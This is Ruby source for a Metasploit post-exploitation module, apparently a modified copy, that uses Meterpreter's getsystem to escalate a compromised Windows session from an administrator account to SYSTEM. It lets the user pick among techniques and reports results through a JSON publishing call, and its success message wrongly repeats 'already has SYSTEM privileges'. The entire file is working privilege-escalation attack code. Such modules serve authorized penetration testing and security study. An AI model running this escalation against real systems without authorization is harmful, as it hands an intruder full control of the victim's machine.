##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv


  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Escalate Get System via Administrator',
                      'Description'  => %q{
          This module uses the builtin 'getsystem' command to escalate
        the current session to the SYSTEM account from an administrator
        user account.
      },
                      'License'      => MSF_LICENSE,
                      'Author'       => 'hdm',
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options([
                             OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-5), otherwise try them all", 0])
                     ])

  end


  def run
    @result   = {:status => false, :message => nil, :data => nil}
    technique = datastore['TECHNIQUE'].to_i

    if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
      pub_json_result(false,
                      "This platform is not supported with this script",
                      nil,
                      self.uuid)
      return
    end


    if is_system?
      pub_json_result(false,
                      "This session already has SYSTEM privileges",
                      nil,
                      self.uuid)
      return
    end

    begin
      result = client.priv.getsystem(technique)
      pub_json_result(true,
                      "This session already has SYSTEM privileges by  technique #{result[1]}",
                      nil,
                      self.uuid)
    rescue Rex::Post::Meterpreter::RequestError => e
      @result[:message] = "Failed to obtain SYSTEM access"
      pub_json_result(false,
                      "Failed to obtain SYSTEM access",
                      nil,
                      self.uuid)
    end
  end
end
